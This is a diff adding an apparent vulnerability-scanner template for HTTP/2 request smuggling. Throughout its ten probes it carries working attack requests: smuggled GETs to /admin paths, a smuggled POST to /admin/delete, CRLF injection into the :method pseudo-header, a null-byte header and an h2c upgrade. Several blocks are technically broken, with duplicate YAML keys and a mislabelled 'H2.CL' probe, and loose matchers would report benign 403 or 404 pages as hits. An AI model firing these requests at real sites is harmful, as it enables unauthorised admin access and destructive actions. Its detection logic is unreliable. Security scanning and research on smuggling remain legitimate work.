@@ -1,0 +1,361 @@
+id: medium-webapp-http2-request-smuggling
+
+info:
+  name: HTTP/2 Request Smuggling - Elite Red Team
+  author: elite-red-team
+  severity: high
+  description: |
+    Advanced HTTP/2 request smuggling detection using multiple techniques.
+    Tests for HTTP/2 downgrade vulnerabilities, header manipulation, and protocol confusion.
+    Includes H2.CL, H2.TE, and HTTP/2 pseudo-header manipulation attacks.
+  reference:
+    - https://portswigger.net/web-security/request-smuggling/advanced
+    - https://blog.portswigger.net/2021/10/http2-exclusive-request-smuggling.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L
+    cvss-score: 8.6
+    cwe-id: CWE-444
+  tags: http2,request-smuggling,protocol-confusion,red-team
+
+variables:
+  # Smuggled request payload
+  smuggled_payload: "GET /admin HTTP/1.1\r\nHost: {{Hostname}}\r\nX-Smuggled: true\r\n\r\n"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/"
+      - "{{BaseURL}}/api"
+      - "{{BaseURL}}/search"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Transfer-Encoding: chunked
+      Content-Length: "0"
+      # HTTP/2 pseudo-headers manipulation
+      :method: POST
+      :path: /
+      :scheme: https
+      :authority: "{{Hostname}}"
+
+    body: |
+      0
+
+      GET /admin HTTP/1.1
+      Host: {{Hostname}}
+      X-Smuggled-Request: true
+      Content-Length: 0
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 404
+          - 403
+
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "dashboard"
+          - "unauthorized"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "X-Smuggled"
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - 'X-Smuggled[^:]*:\s*([^\r\n]+)'
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      # H2.CL vulnerability - Content-Length with chunked encoding
+      Content-Length: "6"
+      Transfer-Encoding: chunked
+      X-Forwarded-For: 127.0.0.1
+
+    body: |
+      0
+
+      GET /admin HTTP/1.1
+      Host: {{Hostname}}
+      X-H2CL-Smuggled: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+          - 404
+
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "H2CL"
+          - "smuggled"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+
+    headers:
+      # HTTP/2 pseudo-header injection
+      :method: "GET\r\nX-Injected: true"
+      :path: "/"
+      :scheme: https
+      :authority: "{{Hostname}}"
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+
+      - type: word
+        part: body
+        words:
+          - "X-Injected"
+          - "injected"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/search"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      # HTTP/2 header name with space
+      "Content Length": "44"
+      Transfer-Encoding: chunked
+
+    body: |
+      0
+
+      POST /admin/delete HTTP/1.1
+      Host: {{Hostname}}
+      Content-Length: 0
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 404
+          - 403
+
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "delete"
+          - "forbidden"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+
+    headers:
+      # HTTP/2 pseudo-header case manipulation
+      :Method: GET
+      :Path: /admin
+      :Scheme: https
+      :Authority: "{{Hostname}}"
+      X-Forwarded-Proto: https
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 403
+          - 404
+
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "dashboard"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      # HTTP/2 connection-specific headers
+      Connection: keep-alive
+      Upgrade: h2c
+      HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
+
+    body: |
+      PRI * HTTP/2.0
+
+      SM
+
+      GET /admin HTTP/1.1
+      Host: {{Hostname}}
+      X-H2C-Upgrade: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 101
+          - 400
+
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "h2c"
+          - "upgrade"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api"
+
+    headers:
+      Content-Type: application/json
+      # HTTP/2 header with null byte
+      "X-Custom\x00Header": "smuggled"
+      Content-Length: "0"
+
+    body: |
+      GET /admin/users HTTP/1.1
+      Host: {{Hostname}}
+      X-Null-Byte-Smuggled: true
+      Content-Length: 0
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "users"
+          - "smuggled"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+
+    headers:
+      # HTTP/2 duplicate pseudo-headers
+      :method: GET
+      :method: POST
+      :path: /
+      :path: /admin
+      :authority: "{{Hostname}}"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "duplicate"
+          - "error"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      # HTTP/2 header folding attempt
+      X-Folded-Header: "line1
+       line2"
+      Content-Length: "0"
+
+    body: |
+      GET /admin HTTP/1.1
+      Host: {{Hostname}}
+      X-Folded-Smuggled: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "folded"
+        condition: or
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/upload"
+
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+      # HTTP/2 with malformed content-length
+      Content-Length: "999999999999999999999"
+      Transfer-Encoding: chunked
+
+    body: |
+      0
+
+      GET /admin/config HTTP/1.1
+      Host: {{Hostname}}
+      X-Malformed-CL: true
+      Content-Length: 0
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+          - 413
+
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "config"
+          - "malformed"
+        condition: or
+
+    extractors:
+      - type: regex
+        part: response
+        regex:
+          - 'HTTP/2\s+(\d+)'
+          - 'X-[^:]*Smuggled[^:]*:\s*([^\r\n]+)'
+          - 'Server:\s*([^\r\n]+)'
